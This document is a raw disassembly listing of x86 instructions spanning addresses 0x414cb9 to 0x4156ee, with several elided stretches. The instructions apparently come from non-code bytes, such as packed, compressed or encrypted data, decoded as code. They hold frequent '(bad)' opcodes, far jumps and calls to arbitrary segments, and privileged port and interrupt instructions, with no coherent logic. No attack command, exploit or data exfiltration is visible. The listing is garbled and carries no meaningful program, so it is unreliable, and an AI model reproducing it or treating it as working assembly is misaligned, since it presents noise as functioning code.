  414cb9:	xchg   DWORD PTR [ecx+0x6be31b61],ebp
  414cbf:	fwait
  414cc0:	sbb    DWORD PTR [ebx+0x4],edx
  414cc3:	pop    ss
  414cc4:	sbb    eax,0x93cbb3c0
  414cc9:	push   esp
  414cca:	retf   0x695d
  414ccd:	call   0xe6b4:0x643e8d18
  414cd4:	rcr    DWORD PTR [edx+0x6a9b0dc4],0xc9
  414cdb:	jne    0x414cdd
  414cdd:	fild   WORD PTR [edx+0x829806a]
  414ce3:	addr16 (bad) 
  414ce5:	jmp    0x414cd5
  414ce7:	aas    
  414ce8:	xor    al,0xe9
  414cea:	arpl   WORD PTR [edi],sp
  414cec:	lock mov esp,0x891649e3
  414cf2:	mov    ebp,0xa1d75707
  414cf7:	inc    esp
  414cf8:	mov    edx,0x723bd8bb
  414cfd:	loop   0x414d1f
  414cff:	mov    dh,0xa5
  414d01:	adc    ecx,0xffffff9a
  414d04:	outs   dx,BYTE PTR ds:[esi]
  414d05:	ins    BYTE PTR es:[edi],dx
  414d06:	inc    ecx
  414d07:	mov    al,0x1d
  414d09:	ret    
  414d0a:	iret   
  414d0b:	pusha  
  414d0c:	mov    esp,0xaf1f481b
  414d11:	(bad)  
  414d12:	fsubr  DWORD PTR [ecx]
  414d14:	test   al,0x93
  414d16:	or     DWORD PTR [edx],0xffffffe7
  414d19:	push   es
  414d1a:	xchg   cl,ah
  414d1c:	push   ecx
  414d1d:	(bad)  
  414d1e:	das    
  414d1f:	dec    edi
  414d20:	pop    edx
  414d21:	dec    esi
  414d22:	adc    bl,cl
  414d24:	cwde   
  414d25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d26:	xchg   esi,eax
  414d27:	cmp    esi,edx
  414d29:	fmul   DWORD PTR [edx-0x3d]
  414d2c:	std    
  414d2d:	inc    eax
  414d2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d2f:	rcr    BYTE PTR [ebx],1
  414d31:	ret    
  414d32:	out    dx,eax
  414d33:	jg     0x414ccd
	...
  414d95:	add    BYTE PTR [edi+0x3e911299],dh
  414d9b:	fwait
  414d9c:	mov    bh,0xbf
  414d9e:	sbb    DWORD PTR [esi+0x43de1445],ebp
  414da4:	pop    ebp
  414da5:	stos   BYTE PTR es:[edi],al
  414da6:	xor    ebx,ecx
  414da8:	add    BYTE PTR [eax],al
  414daa:	pop    es
  414dab:	add    DWORD PTR [eax],eax
  414dad:	add    BYTE PTR [ebp+edi*2-0x74],cl
  414db1:	pushf  
  414db2:	out    dx,al
  414db3:	sub    al,0x77
  414db5:	lds    edx,FWORD PTR [edx+0x63]
  414db8:	sub    ah,al
  414dba:	aas    
  414dbb:	mov    dl,0xfb
  414dbd:	call   0x1942:0xe93af74a
  414dc4:	into   
  414dc5:	sub    al,0xb
  414dc7:	jl     0x414de2
  414dc9:	ror    BYTE PTR [eax+0x4ad40301],cl
  414dcf:	jne    0x414d5e
  414dd1:	cld    
  414dd2:	pop    ecx
  414dd3:	mov    esp,0x29902d7a
  414dd8:	(bad)  
  414dd9:	mov    bh,0x89
  414ddb:	in     eax,dx
  414ddc:	std    
  414ddd:	sub    eax,0x3660348b
  414de2:	or     bl,BYTE PTR [ecx-0x3f]
  414de5:	sbb    eax,0x5db6fad6
  414dea:	lea    ebp,[eax-0x12c35311]
  414df0:	clc    
  414df1:	out    dx,al
  414df2:	aas    
  414df3:	ins    BYTE PTR es:[edi],dx
  414df4:	ss in  al,0x9
  414df7:	adc    edx,DWORD PTR [eax+0x7ab68843]
  414dfd:	jg     0x414e25
  414dff:	inc    eax
  414e00:	or     al,0x27
  414e02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e04:	cmp    eax,0x5ababebf
  414e09:	imul   esi,DWORD PTR ds:0xfb4638fe,0x75e77637
  414e13:	inc    esp
  414e14:	and    BYTE PTR [edi+eax*4-0x3c],cl
  414e18:	push   ecx
  414e19:	mov    edi,0xd88bbdff
  414e1e:	mov    eax,0x400ebc55
  414e23:	xor    ecx,edx
  414e25:	fmul   st,st(1)
  414e27:	mov    edx,ebx
  414e29:	sub    BYTE PTR [esi-0x6e],ah
  414e2c:	jbe    0x414dd5
  414e2e:	out    0x98,al
  414e30:	mov    al,0x60
  414e32:	in     al,dx
  414e33:	stos   DWORD PTR es:[edi],eax
  414e34:	adc    eax,0xf0dffe18
  414e39:	into   
  414e3a:	pop    ebx
  414e3b:	bswap  ecx
  414e3d:	imul   edi,DWORD PTR [ecx+0x21f76ce4],0xfffffff2
  414e44:	mov    ebp,0xab071306
  414e49:	xchg   esp,eax
  414e4a:	shl    DWORD PTR [eax+ecx*2-0x49],1
  414e4e:	outs   dx,DWORD PTR ds:[esi]
  414e4f:	dec    ecx
  414e50:	pop    esp
  414e51:	inc    ebx
  414e52:	push   esp
  414e53:	adc    al,0xbb
  414e55:	jno    0x414e83
  414e57:	inc    eax
  414e58:	rol    DWORD PTR [ebp-0x7e0acfb5],0x92
  414e5f:	call   0xe551a002
  414e64:	mov    bh,0xb4
  414e66:	lods   eax,DWORD PTR ds:[esi]
  414e67:	stos   DWORD PTR es:[edi],eax
  414e68:	xor    al,0x50
  414e6a:	retf   0x62d8
  414e6d:	push   ss
  414e6e:	xchg   edi,eax
  414e6f:	(bad)  
  414e70:	push   ebx
  414e71:	add    eax,0x823d9cd8
  414e76:	aaa    
  414e77:	dec    ecx
  414e78:	sub    ah,BYTE PTR [ecx+edx*4-0x30908e38]
  414e7f:	mov    BYTE PTR [eax+0x3386792a],0xe1
  414e86:	inc    eax
  414e87:	cwde   
  414e88:	(bad)  
  414e89:	adc    cl,bl
  414e8b:	icebp  
  414e8c:	mov    ds,ebp
  414e8e:	dec    esp
  414e8f:	popa   
  414e90:	stos   BYTE PTR es:[edi],al
  414e91:	dec    ecx
  414e92:	cs in  eax,0x6a
  414e95:	cmp    DWORD PTR [ecx-0x66883335],esp
  414e9b:	jge    0x414e81
  414e9d:	mov    edx,0xde65da7e
  414ea2:	mov    ds:0xab171146,eax
  414ea8:	ret    0x5041
  414eab:	call   0x76f9c6
  414eb0:	sar    BYTE PTR [esi+0x4f],0x17
  414eb4:	xchg   DWORD PTR [eax],eax
	...
  414f16:	aaa    
  414f17:	data16 xor al,0x9b
  414f1a:	jne    0x414ef7
  414f1c:	mov    edi,0x6e73ee
  414f21:	xchg   ebp,eax
  414f22:	mov    ds:0x3acf14fa,al
  414f27:	fiadd  DWORD PTR [eax]
  414f29:	add    BYTE PTR [edi],al
  414f2b:	add    DWORD PTR [eax],eax
  414f2d:	add    BYTE PTR [ecx+0x32],cl
  414f30:	hlt    
  414f31:	lock jl 0x414f65
  414f34:	shl    BYTE PTR [ebp+ebp*1-0x48],cl
  414f38:	add    BYTE PTR [edx],0x9d
  414f3b:	xlat   BYTE PTR ds:[ebx]
  414f3c:	jno    0x414f0c
  414f3e:	xchg   esp,eax
  414f3f:	popf   
  414f40:	add    eax,0x472f76c1
  414f45:	add    DWORD PTR [ebx-0x59195dcc],esp
  414f4b:	rol    al,cl
  414f4d:	xchg   esp,eax
  414f4e:	pop    ds
  414f4f:	cmp    edx,0xffffffea
  414f52:	test   al,0x12
  414f54:	int3   
  414f55:	jns    0x414f45
  414f57:	cs jmp 0xb8159a0b
  414f5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f5e:	sub    BYTE PTR [eax-0x69],0x32
  414f62:	int    0x57
  414f64:	jae    0x414fcb
  414f66:	jecxz  0x414f5f
  414f68:	stc    
  414f69:	sub    DWORD PTR [ebx+edx*2],esp
  414f6c:	xchg   ebp,eax
  414f6d:	pop    eax
  414f6e:	ja     0x414f81
  414f70:	inc    ecx
  414f71:	dec    esp
  414f72:	aad    0xc8
  414f74:	mov    al,0x71
  414f76:	lods   eax,DWORD PTR ds:[esi]
  414f77:	sahf   
  414f78:	jmp    0x8637b890
  414f7d:	xor    DWORD PTR [edx],edi
  414f7f:	jp     0x414f83
  414f81:	les    ebx,FWORD PTR [edi-0x1a]
  414f84:	sbb    DWORD PTR [eax-0x7a],edx
  414f87:	(bad)  
  414f88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f89:	int3   
  414f8a:	ret    
  414f8b:	cdq    
  414f8c:	mov    WORD PTR [eax-0x51],fs
  414f8f:	sub    ecx,DWORD PTR ds:[ebp+0x49]
  414f93:	fdivr  QWORD PTR [eax+0x786068ce]
  414f99:	mov    bh,0x80
  414f9b:	imul   edi,DWORD PTR [ecx-0x32f998e0],0xa09018af
  414fa5:	cmp    esp,DWORD PTR [esi+0x62]
  414fa8:	cdq    
  414fa9:	jbe    0x41500d
  414fab:	mov    esp,0x7f494a14
  414fb0:	or     DWORD PTR [ebp+0x3224227f],edi
  414fb6:	dec    edi
  414fb7:	inc    edi
  414fb8:	icebp  
  414fb9:	sub    cl,BYTE PTR [ebp+0x26]
  414fbc:	js     0x414f64
  414fbe:	pusha  
  414fbf:	sub    DWORD PTR [ecx+eiz*8+0x4e],0x3
  414fc4:	sbb    DWORD PTR [edx-0x6f52ca2f],0x27586b43
  414fce:	outs   dx,DWORD PTR ds:[esi]
  414fcf:	push   es
  414fd0:	inc    DWORD PTR [ebp+esi*8-0x30120e3c]
  414fd7:	popa   
  414fd8:	in     al,0x51
  414fda:	inc    esp
  414fdb:	fnstsw WORD PTR [ecx-0x72ab6109]
  414fe1:	aaa    
  414fe2:	(bad)  
  414fe3:	xlat   BYTE PTR ds:[ebx]
  414fe4:	mov    eax,ds:0x53d03e88
  414fe9:	xchg   ecx,eax
  414fea:	(bad)  
  414feb:	fwait
  414fec:	(bad)  
  414fed:	das    
  414fee:	imul   eax,DWORD PTR [ebx+0x48],0x85145432
  414ff5:	inc    dx
  414ff7:	jmp    0x8bd9dd60
  414ffc:	(bad)  
  414ffd:	retf   0xa88d
  415000:	or     eax,0x9d31bb1c
  415005:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415006:	(bad)  
  415007:	gs (bad) 
  415009:	daa    
  41500a:	test   DWORD PTR cs:0xd62a3d69,0xb5630637
  415015:	imul   eax,DWORD PTR [edx+0x708b6c47],0x12fdd117
  41501f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415020:	push   0xffffffc2
  415022:	imul   ah
  415024:	add    dl,BYTE PTR [edx+0x4c]
  415027:	cmc    
  415028:	(bad)  
  415029:	and    DWORD PTR [esi+0x2b],ebx
  41502c:	lock and edx,ebp
  41502f:	push   esp
  415030:	scas   al,BYTE PTR es:[edi]
  415031:	or     BYTE PTR [edi+0x96b],bl
	...
  415093:	add    BYTE PTR [eax],al
  415095:	add    BYTE PTR [ebx+0x2],bh
  415098:	add    ebp,ebx
  41509a:	jnp    0x415087
  41509c:	sti    
  41509d:	xchg   edx,eax
  41509e:	and    BYTE PTR [ebx],ah
  4150a0:	pushf  
  4150a1:	test   eax,0xd40c98ea
  4150a6:	inc    ecx
  4150a7:	fild   DWORD PTR [eax]
  4150a9:	add    BYTE PTR [edi],al
  4150ab:	add    DWORD PTR [eax],eax
  4150ad:	add    BYTE PTR [edx+ebx*8+0xce99681],bl
  4150b4:	or     ebx,esi
  4150b6:	xor    al,0xd3
  4150b8:	(bad)  
  4150b9:	fs in  al,dx
  4150bb:	sti    
  4150bc:	jl     0x415087
  4150be:	shl    BYTE PTR [ecx+0x713a28e8],0x51
  4150c5:	pop    edx
  4150c6:	xor    eax,0x9de95227
  4150cb:	pop    ebp
  4150cc:	outs   dx,DWORD PTR ds:[esi]
  4150cd:	mov    eax,0x59fbb5d2
  4150d2:	gs cs jge 0x41512a
  4150d6:	cwde   
  4150d7:	mov    al,0x57
  4150d9:	xlat   BYTE PTR ds:[ebx]
  4150da:	les    edx,FWORD PTR ds:0x9b81a1b8
  4150e0:	test   al,0xb7
  4150e2:	xlat   BYTE PTR ds:[ebx]
  4150e3:	je     0x41507b
  4150e5:	xchg   esp,eax
  4150e6:	lahf   
  4150e7:	or     ah,BYTE PTR [edi+0x5f]
  4150ea:	adc    dh,BYTE PTR [eax-0x2c]
  4150ed:	aam    0x8f
  4150ef:	lds    edi,FWORD PTR [ecx+0x29]
  4150f2:	push   0x6b518aa0
  4150f7:	or     edx,esp
  4150f9:	or     al,0xd0
  4150fb:	push   ecx
  4150fc:	scas   eax,DWORD PTR es:[edi]
  4150fd:	dec    ebx
  4150fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150ff:	scas   al,BYTE PTR es:[edi]
  415100:	and    eax,DWORD PTR ds:0x356d747b
  415106:	jb     0x4150ad
  415108:	in     eax,dx
  415109:	lock (bad) 
  41510c:	push   esi
  41510d:	cmc    
  41510e:	pop    esp
  41510f:	mov    ebp,0xa9d4ed73
  415114:	and    dl,BYTE PTR [esi]
  415116:	popf   
  415117:	add    BYTE PTR [eax],cl
  415119:	loopne 0x4150e3
  41511b:	and    BYTE PTR [edi+0x25],bh
  41511e:	rcl    ecx,cl
  415120:	push   esp
  415121:	jle    0x4150b9
  415123:	(bad)  
  415124:	jmp    0x327b:0x83c2e8c2
  41512b:	mov    bl,0x96
  41512d:	outs   dx,DWORD PTR ds:[esi]
  41512e:	jg     0x4151a0
  415130:	stc    
  415131:	xchg   ebx,eax
  415132:	lea    ecx,[eax+ecx*1]
  415135:	retf   0xc4d1
  415138:	div    BYTE PTR [eax-0x60fc5240]
  41513e:	fistp  DWORD PTR [esp+eax*2-0x28]
  415142:	scas   al,BYTE PTR es:[edi]
  415143:	push   edx
  415144:	mov    eax,0x9dd94fdd
  415149:	dec    esp
  41514a:	jecxz  0x415109
  41514c:	or     edx,DWORD PTR [ebx+edi*1+0x53]
  415150:	cmp    eax,0x1f7e76ec
  415155:	and    ebx,ecx
  415157:	mov    dl,0x50
  415159:	mov    edi,0x71dbbca7
  41515e:	jb     0x4151dd
  415160:	js     0x415188
  415162:	shl    BYTE PTR [eax-0x1],1
  415165:	les    edi,FWORD PTR [edx+0x11187a43]
  41516b:	inc    edi
  41516c:	jecxz  0x41516e
  41516e:	pop    ebx
  41516f:	or     edi,eax
  415171:	daa    
  415172:	test   DWORD PTR [esi],edx
  415174:	ss pop ebp
  415176:	stos   DWORD PTR es:[edi],eax
  415177:	inc    eax
  415178:	pop    ss
  415179:	sbb    eax,0xa1c16cb7
  41517e:	(bad)  
  41517f:	adc    ebx,0x6a7912c6
  415185:	test   eax,0x20871307
  41518a:	test   DWORD PTR [edx],eax
  41518c:	fdiv   QWORD PTR [edx+esi*2]
  41518f:	ror    BYTE PTR [edx+0x56],cl
  415192:	icebp  
  415193:	adc    eax,0x4a21d66f
  415198:	and    DWORD PTR [edi],esi
  41519a:	xor    cl,BYTE PTR [eax-0x3a]
  41519d:	add    ebp,edx
  41519f:	adc    eax,0x97244d99
  4151a4:	out    dx,eax
  4151a5:	xchg   ebp,eax
  4151a6:	pop    ebp
  4151a7:	out    dx,eax
  4151a8:	mov    dl,0xd
  4151aa:	push   edi
  4151ab:	daa    
  4151ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151ad:	lahf   
  4151ae:	int    0x7f
  4151b0:	xchg   edi,eax
  4151b1:	mov    DWORD PTR [ebp+0x7035],edx
	...
  415213:	add    BYTE PTR [eax],al
  415215:	add    BYTE PTR [edi+edx*4],ch
  415218:	pop    ds
  415219:	sar    DWORD PTR [edi+0xffeed9],1
  41521f:	lods   eax,DWORD PTR ds:[esi]
  415220:	std    
  415221:	mov    al,0x93
  415223:	xor    eax,0xdc48fe55
  415228:	add    BYTE PTR [eax],al
  41522a:	pop    es
  41522b:	add    DWORD PTR [eax],eax
  41522d:	add    BYTE PTR [edx],dh
  41522f:	ja     0x41525a
  415231:	cmp    ebx,DWORD PTR [ecx]
  415233:	loop   0x415275
  415235:	mov    edx,0x76cbc157
  41523a:	test   DWORD PTR [edx-0xdcc071b],ecx
  415240:	xor    BYTE PTR [esi],ah
  415242:	sbb    eax,0xbe1b6486
  415247:	enter  0xb8ac,0x4e
  41524b:	inc    ecx
  41524c:	repnz in eax,0xf2
  41524f:	xchg   esp,eax
  415250:	mov    edx,DWORD PTR [ebp+0x2b]
  415253:	jmp    0x6a3494c1
  415258:	xchg   esi,eax
  415259:	ins    BYTE PTR es:[edi],dx
  41525a:	mov    ds:0x91043581,al
  41525f:	aam    0xc7
  415261:	pop    esi
  415262:	lods   al,BYTE PTR ds:[esi]
  415263:	cmc    
  415264:	pushf  
  415265:	add    DWORD PTR [bx+si],0xffffff89
  415269:	daa    
  41526a:	pop    ebp
  41526b:	pop    eax
  41526c:	sub    eax,0xb8040e7
  415271:	adc    al,0x1e
  415273:	mov    ebx,0xbc50a043
  415278:	aaa    
  415279:	mov    ch,BYTE PTR [ebp-0x28]
  41527c:	repz mov edi,0x76bcd718
  415282:	mov    bl,bl
  415284:	mov    DWORD PTR [eax+0x18],eax
  415287:	add    BYTE PTR [edx+ecx*4-0x3d],dl
  41528b:	in     eax,0x72
  41528d:	jmp    0x41528c
  41528f:	mov    ebx,0x7807b087
  415294:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415295:	sub    ecx,edx
  415297:	and    cl,BYTE PTR [ebp+0x25]
  41529a:	ret    0x2a09
  41529d:	imul   edx,DWORD PTR [ebx+ecx*1+0x72],0xb50263c
  4152a5:	jmp    0xa8ea18b
  4152aa:	aad    0x70
  4152ac:	(bad)  
  4152ae:	xchg   ebp,eax
  4152af:	add    eax,0x4c8642de
  4152b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152b5:	mov    al,ds:0xa2eaf21b
  4152ba:	mov    ah,BYTE PTR [esi]
  4152bc:	xchg   DWORD PTR ds:0x9d4812d6,eax
  4152c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152c3:	aad    0xba
  4152c5:	(bad)  
  4152c7:	pop    edi
  4152c8:	lock out dx,al
  4152ca:	test   al,0x0
  4152cc:	push   esp
  4152cd:	(bad)  
  4152ce:	jle    0x41530c
  4152d0:	adc    BYTE PTR [eax+eiz*1+0x62],dl
  4152d4:	push   esp
  4152d5:	jmp    0xb6d3:0xe29f61a5
  4152dc:	in     eax,0xd6
  4152de:	cmp    BYTE PTR [edx],ch
  4152e0:	pcmpeqd mm6,QWORD PTR [esi]
  4152e3:	mov    dh,0xb6
  4152e5:	inc    esi
  4152e6:	lds    edi,FWORD PTR [edi+0x22]
  4152e9:	mov    ebp,0xbebb756
  4152ee:	fisubr DWORD PTR [edi+0x2c]
  4152f1:	stc    
  4152f2:	out    0xfa,al
  4152f4:	push   cs
  4152f5:	mov    eax,ds:0x69cd88d1
  4152fa:	loop   0x41531c
  4152fc:	adc    ebx,DWORD PTR [eax]
  4152fe:	test   BYTE PTR [ebx-0xcff44b0],al
  415304:	jno    0x41529b
  415306:	jno    0x4152a7
  415308:	sbb    ah,0x12
  41530b:	icebp  
  41530c:	(bad)  
  41530d:	xchg   edi,eax
  41530e:	nop
  41530f:	ret    0x8792
  415312:	in     eax,0xf6
  415314:	xor    dl,BYTE PTR [edi]
  415316:	mov    dl,0xcb
  415318:	dec    edx
  415319:	mov    cl,BYTE PTR [ebx-0x6a8fb211]
  41531f:	retf   
  415320:	iret   
  415321:	sbb    ebx,edx
  415323:	adc    eax,ecx
  415325:	sub    ecx,0xffffffb4
  415328:	dec    eax
  415329:	add    BYTE PTR [ecx],ah
  41532b:	aaa    
  41532c:	sbb    BYTE PTR [edx-0x6d],cl
  41532f:	in     al,0xe3
  415331:	jg     0x41539c
  415333:	xchg   edi,eax
  415334:	add    BYTE PTR [eax],0x0
	...
  415393:	add    BYTE PTR [eax],al
  415395:	add    BYTE PTR [ebp-0x10],ch
  415398:	repz jmp FWORD PTR cs:[edi]
  41539c:	std    
  41539d:	repz mov ebx,0x1a4b9b2a
  4153a3:	pop    edx
  4153a4:	push   es
  4153a5:	and    cl,BYTE PTR [edi-0x23]
  4153a8:	add    BYTE PTR [eax],al
  4153aa:	pop    es
  4153ab:	add    DWORD PTR [eax],eax
  4153ad:	add    BYTE PTR [ebx-0x3a],bh
  4153b0:	sbb    eax,0x355ad5a2
  4153b5:	aam    0x62
  4153b7:	pop    esp
  4153b8:	and    BYTE PTR [edx-0xe],al
  4153bb:	fcmovne st,st(5)
  4153bd:	fld    st(0)
  4153bf:	ins    DWORD PTR es:[edi],dx
  4153c0:	fdivr  DWORD PTR [ebx+eax*8+0xe]
  4153c4:	rcr    BYTE PTR [eax],0xfa
  4153c7:	in     al,0x80
  4153c9:	aam    0x98
  4153cb:	setg   ah
  4153ce:	add    eax,0x9a2ea724
  4153d3:	jnp    0x415451
  4153d5:	loopne 0x4153c0
  4153d7:	out    0x92,eax
  4153d9:	sbb    DWORD PTR [edx+ebx*4],edx
  4153dc:	lahf   
  4153dd:	repnz mov dh,0x46
  4153e0:	adc    eax,0x5828ce9d
  4153e5:	je     0x41539b
  4153e7:	jge    0x4153f5
  4153e9:	sub    ah,BYTE PTR [ecx]
  4153eb:	sub    bh,BYTE PTR [ebx+eiz*1]
  4153ee:	mov    BYTE PTR [esi+ecx*4-0xa44cfcc],ah
  4153f5:	pusha  
  4153f6:	stos   BYTE PTR es:[edi],al
  4153f7:	adc    eax,DWORD PTR [ebp+0x483d8a27]
  4153fd:	mov    ebp,DWORD PTR es:[edi-0x4d]
  415401:	xchg   ebp,eax
  415402:	mov    DWORD PTR [edx+0x7d],ecx
  415405:	lds    edi,FWORD PTR [edx]
  415407:	es push ds
  415409:	ret    0x52a6
  41540c:	test   DWORD PTR [edi-0x700202cf],edx
  415412:	jnp    0x41546c
  415414:	dec    edi
  415415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415416:	es push ebx
  415418:	scas   al,BYTE PTR es:[edi]
  415419:	jne    0x4153f8
  41541b:	(bad)
  41541f:	int3   
  415420:	xor    al,al
  415422:	mov    esp,0xf423b811
  415427:	stc    
  415428:	jo     0x415400
  41542a:	jae    0x41547f
  41542c:	jl     0x415444
  41542e:	or     eax,0xa99eb321
  415433:	inc    eax
  415434:	jle    0x41547e
  415436:	xchg   ecx,eax
  415437:	jge    0x415471
  415439:	call   FWORD PTR [ecx-0x38]
  41543c:	int    0x1a
  41543e:	and    DWORD PTR [eax-0x72],0xfac4e3d8
  415445:	sar    ebx,1
  415447:	xchg   esp,eax
  415448:	scas   al,BYTE PTR es:[edi]
  415449:	iret   
  41544a:	test   eax,0x3073ed4
  41544f:	mov    ebp,0xfad0c940
  415454:	dec    ebp
  415455:	xchg   ebp,eax
  415456:	sub    BYTE PTR [ebx],cl
  415458:	cmp    eax,0x7e8fbabf
  41545d:	jmp    0x27683c8e
  415462:	adc    DWORD PTR [ebx],0xa0c86c77
  415468:	enter  0xfce6,0x13
  41546c:	jnp    0x415448
  41546e:	xor    esi,esp
  415470:	call   0x81b33100
  415475:	in     al,0xce
  415477:	add    edi,ebx
  415479:	mov    edx,0x2685f0ed
  41547e:	clc    
  41547f:	dec    esp
  415480:	push   eax
  415481:	out    0x14,eax
  415483:	jmp    0x69d:0x9a68baf4
  41548a:	scas   eax,DWORD PTR es:[edi]
  41548b:	inc    esp
  41548c:	out    0xde,al
  41548e:	pop    es
  41548f:	pop    edi
  415490:	outs   dx,BYTE PTR ds:[esi]
  415491:	mov    esp,0xb7fd9620
  415496:	jp     0x4154f0
  415498:	jbe    0x415470
  41549a:	test   BYTE PTR [edi-0x5f],al
  41549d:	jmp    0xd07698b7
  4154a2:	jae    0x415428
  4154a4:	jae    0x415523
  4154a6:	mov    bh,0x3d
  4154a8:	das    
  4154a9:	push   edx
  4154aa:	push   edi
  4154ab:	popa   
  4154ac:	dec    eax
  4154ad:	and    bh,BYTE PTR [eax]
  4154af:	(bad)  
  4154b0:	add    eax,0x57f10632
	...
  415515:	add    ah,ah
  415517:	lock sub DWORD PTR [edx],ecx
  41551a:	cmp    eax,0xc0fee7db
  41551f:	cmp    ebx,DWORD PTR [edi]
  415521:	pop    esp
  415522:	in     eax,0x66
  415524:	stos   BYTE PTR es:[edi],al
  415525:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415526:	push   esi
  415527:	fiadd  WORD PTR [eax]
  415529:	add    BYTE PTR [edi],al
  41552b:	add    DWORD PTR [eax],eax
  41552d:	add    BYTE PTR [edi-0x3206a04],dh
  415533:	xchg   esp,eax
  415534:	mov    ah,ah
  415536:	push   0xaf1dd517
  41553b:	enter  0x2f58,0x47
  41553f:	mov    BYTE PTR [ebp+0x2ac05dcc],bh
  415545:	shr    esi,cl
  415547:	and    bl,cl
  415549:	pop    ebp
  41554a:	rcr    dl,cl
  41554c:	hlt    
  41554d:	(bad)
  415551:	fld    DWORD PTR [esi-0x3da47b9e]
  415557:	stc    
  415558:	and    ah,BYTE PTR [eax-0x142a934e]
  41555e:	xchg   ebp,eax
  41555f:	mov    esi,0xe4e315d3
  415564:	jmp    0x2a94:0x5daea38a
  41556b:	imul   eax,DWORD PTR [eax+0x6c],0xffffffa4
  41556f:	loop   0x415564
  415571:	outs   dx,BYTE PTR ds:[esi]
  415572:	cmp    eax,0x87d6e1c9
  415577:	xchg   ebx,eax
  415578:	test   DWORD PTR [ecx+0x7c0eb6bd],ebx
  41557e:	adc    edx,DWORD PTR [ebp-0x23]
  415581:	xchg   ebx,eax
  415582:	idiv   DWORD PTR [esi+esi*1-0x14dc7cc5]
  415589:	inc    edi
  41558a:	add    esi,0xa2c21006
  415590:	or     al,0x8c
  415592:	add    cl,BYTE PTR [ebp+0x59]
  415595:	push   ebx
  415596:	sub    eax,0x7086bbb7
  41559b:	test   al,0x3e
  41559d:	pop    ebp
  41559e:	xchg   ebp,eax
  41559f:	inc    esp
  4155a0:	pop    edx
  4155a1:	sbb    ebp,0x6a
  4155a4:	push   0x5881dd7a
  4155a9:	mov    dh,0xa6
  4155ab:	outs   dx,DWORD PTR ds:[esi]
  4155ac:	leave  
  4155ad:	inc    edx
  4155ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155af:	adc    bh,dl
  4155b1:	icebp  
  4155b2:	dec    esp
  4155b3:	clc    
  4155b4:	dec    edx
  4155b5:	cmp    dl,bh
  4155b7:	sub    DWORD PTR [ebx-0xe],ecx
  4155ba:	xor    bh,BYTE PTR [edx+0x3b]
  4155bd:	shl    cl,cl
  4155bf:	sbb    eax,0xf0e8eaf0
  4155c4:	sbb    esp,edi
  4155c6:	out    0xf7,eax
  4155c8:	out    dx,eax
  4155c9:	pop    ds
  4155ca:	dec    edx
  4155cb:	stos   DWORD PTR es:[edi],eax
  4155cc:	cmp    eax,DWORD PTR [eax]
  4155ce:	(bad)
  4155d1:	in     al,dx
  4155d2:	xchg   DWORD PTR [edx+ecx*4],esi
  4155d5:	ja     0x4155d8
  4155d7:	jb     0x415594
  4155d9:	data16 data16 ja 0x415598
  4155dd:	xor    eax,DWORD PTR [esi-0x49]
  4155e0:	shr    DWORD PTR [ebp-0x60ada4e7],cl
  4155e6:	(bad)  
  4155e7:	repnz mov ebp,0xc22f1809
  4155ed:	nop
  4155ee:	neg    BYTE PTR [ecx]
  4155f0:	push   eax
  4155f1:	mov    ds:0xbaa85eec,eax
  4155f6:	adc    ch,ah
  4155f8:	mov    ecx,0xf3a11752
  4155fd:	mov    al,0x24
  4155ff:	mov    eax,DWORD PTR [esi]
  415601:	ret    0x81a4
  415604:	and    al,0x9c
  415606:	or     edi,DWORD PTR [ecx-0x31]
  415609:	dec    edi
  41560a:	dec    ebp
  41560b:	into   
  41560c:	xlat   BYTE PTR ds:[ebx]
  41560d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41560e:	dec    ebp
  41560f:	clc    
  415610:	push   0x60
  415612:	(bad)  
  415613:	sbb    DWORD PTR [edx+0x769757c8],ecx
  415619:	inc    eax
  41561a:	adc    DWORD PTR [edx+0x5e],edi
  41561d:	scas   eax,DWORD PTR es:[edi]
  41561e:	mov    ecx,0x25035018
  415623:	lahf   
  415624:	aad    0xff
  415626:	gs ret 
  415628:	sub    DWORD PTR [ebp+0x6ad87274],ebp
  41562e:	dec    esi
  41562f:	in     al,0x96
  415631:	(bad)  
  415633:	aas    
  415634:	aaa    
	...
  415695:	add    BYTE PTR [ebp-0x66],ch
  415698:	mov    esp,0xfd67ff45
  41569d:	mov    edx,0xaffd40cb
  4156a2:	pusha  
  4156a3:	leave  
  4156a4:	xor    eax,0xdf5d8e
  4156a9:	add    BYTE PTR [edi],al
  4156ab:	add    DWORD PTR [eax],eax
  4156ad:	add    al,al
  4156af:	pusha  
  4156b0:	sub    BYTE PTR [edx+0x69],0x9
  4156b4:	outs   dx,BYTE PTR ds:[esi]
  4156b5:	mov    edi,0xae9fdb5c
  4156ba:	je     0x415642
  4156bc:	or     DWORD PTR [esi],esp
  4156be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156bf:	jb     0x4156eb
  4156c1:	jb     0x415677
  4156c3:	fs jecxz 0x4156c8
  4156c6:	xchg   ebp,eax
  4156c7:	rcr    esi,1
  4156c9:	not    BYTE PTR [eax]
  4156cb:	pop    edi
  4156cc:	stos   DWORD PTR es:[edi],eax
  4156cd:	scas   al,BYTE PTR es:[edi]
  4156ce:	and    DWORD PTR [eax-0x2fe0393d],esi
  4156d4:	mov    esp,0xe430b84
  4156d9:	push   ss
  4156da:	mov    ah,0x81
  4156dc:	sub    BYTE PTR [ebp+0x4e],cl
  4156df:	jbe    0x4156a4
  4156e1:	mov    DWORD PTR [ebx+0x7d],eax
  4156e4:	js     0x415707
  4156e6:	adc    cl,BYTE PTR [ecx+0x7db1f0f9]
  4156ec:	xchg   dh,cl
  4156ee:	hlt    
